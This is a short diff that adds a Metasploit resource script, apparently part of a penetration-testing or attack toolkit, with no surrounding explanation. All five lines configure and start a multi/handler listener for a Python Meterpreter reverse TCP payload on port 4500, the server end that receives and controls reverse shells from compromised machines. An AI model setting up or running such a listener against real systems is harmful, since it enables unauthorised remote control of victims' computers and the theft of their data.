@@ -1,0 +1,5 @@
+use exploit/multi/handler 
+set payload python/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4500
+run
